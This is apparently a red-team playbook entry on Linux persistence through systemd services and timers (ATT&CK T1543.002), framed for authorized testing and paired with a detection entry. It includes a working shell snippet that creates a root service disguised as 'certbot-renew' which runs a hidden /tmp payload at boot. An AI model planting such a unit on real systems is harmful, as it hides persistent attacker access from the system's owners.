---
id: systemd-persist
title: Systemd service/timer persistence
section: Linux persistence (authorized engagements only)
phase: Persistence
attack:
  tactic: TA0003
  techniques: [T1543.002]
platform: [linux]
source: MITRE ATT&CK T1543.002; systemd unit persistence
pair: systemd-persist-auditd
---

A systemd unit is the durable, init-managed callback: define a `.service` and systemd
restarts it on crash and starts it on boot, running as root from a system unit dir. A
paired `.timer` is the cron replacement — schedule-driven execution that survives
reboot without a cron entry. System units live in `/etc/systemd/system/` (admin,
outranks vendor units) and `/usr/lib/systemd/system/`; an unprivileged foothold can
instead drop a **user** unit under `~/.config/systemd/user/` that fires on that user's
login via `systemd --user`. `enable` is what wires it to a boot/timer target; the
`daemon-reload` is what makes systemd read the new file. Authorized persistence testing
only — clean it up and document it.

```sh
# system service (root): unit that re-execs the payload, enabled to start at boot
cat > /etc/systemd/system/certbot-renew.service <<'UNIT'
[Service]
ExecStart=/tmp/.x
Restart=always
[Install]
WantedBy=multi-user.target
UNIT
systemctl daemon-reload && systemctl enable --now certbot-renew.service
```
